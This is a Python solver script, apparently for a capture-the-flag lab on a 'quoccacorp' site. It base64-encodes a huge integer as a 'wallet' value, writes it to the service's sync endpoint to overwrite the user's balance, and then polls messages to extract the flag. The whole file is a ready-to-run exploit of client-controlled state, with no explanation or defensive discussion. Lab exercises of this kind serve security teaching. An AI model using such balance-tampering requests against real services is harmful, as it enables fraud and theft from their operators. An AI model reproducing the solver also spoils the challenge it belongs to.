import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, find_flag

import base64

BASE_URL = "https://relax.quoccacorp.com"

class Solver:
    def __init__(self):
        self.session = get_session()

    def get_base64_wallet_value(self, target_balance: int) -> str:
        num_bytes = (target_balance.bit_length() + 7) // 8 or 1
        quoccabucks_bytes = target_balance.to_bytes(num_bytes)
        base64_encoded = base64.b64encode(quoccabucks_bytes)
        return base64_encoded.decode()

    def main(self):
        value = self.get_base64_wallet_value(2 ** 9999)

        self.session.put(
            f"{BASE_URL}/service/sync",
            json={"key": "wallet", "value": value},
        )

        response = self.session.get(f"{BASE_URL}/service/messagePoll")
        return find_flag(response.text)

if __name__ == "__main__":
    Solver().main()